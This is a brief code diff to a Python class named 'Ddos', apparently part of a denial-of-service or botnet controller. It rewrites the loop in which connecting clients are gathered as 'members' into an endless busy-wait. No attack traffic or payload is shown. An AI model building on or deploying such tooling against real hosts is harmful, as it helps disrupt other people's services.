@@ -79,9 +79,13 @@ class Ddos:
     def _JoinParty(self):
         self.members = []
         self.sock.setblocking(False)
-        while self.Join:
-            try:
-                self.members.append(self.sock.accept()[0])
-            except Exception:
+        while True:
+            if self.Join:
+                try:
+                    self.members.append(self.sock.accept()[0])
+                except Exception:
+                    pass
+            else:
                 pass
+
 
